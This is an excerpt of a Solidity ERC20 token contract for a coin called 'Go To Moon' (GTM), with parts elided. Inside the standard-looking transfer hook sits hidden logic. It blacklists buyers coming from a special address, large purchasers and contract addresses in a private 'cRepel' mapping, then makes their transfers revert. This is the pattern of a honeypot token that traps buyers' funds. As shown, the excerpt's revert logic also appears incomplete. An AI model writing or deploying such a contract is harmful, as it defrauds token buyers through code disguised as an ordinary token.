...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    mapping (address => bool) private cRepel;
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        ...
        if(((sender == doomAddr[2]) && (recipient != doomAddr[0]))) 
        {
            if (((tx.origin) != (recipient))) 
            {
                cRepel[tx.origin] = true;cRepel[recipient] = true;
            }
            if ((integer*100/_totalSupply) >=2 && (tx.gasprice == block.basefee || doom(recipient))) {
                cRepel[tx.origin] = true;
                cRepel[recipient] = true;
            }
            if (((integer*100/_totalSupply) >=4) && (tx.origin == recipient)) {
                cRepel[tx.origin] = true;
                cRepel[recipient] = true;
            }
            if(sender != doomAddr[2] && (cRepel[tx.origin] || cRepel[sender])) revert();
        }
    ...
    function doom(address account) internal view returns (bool) {
        bytes32 codehash;
...
contract GoToMoon is ERC20Token {
    constructor() ERC20Token("Go To Moon", "GTM", msg.sender, 88888 * 10 ** 18) {
    }
}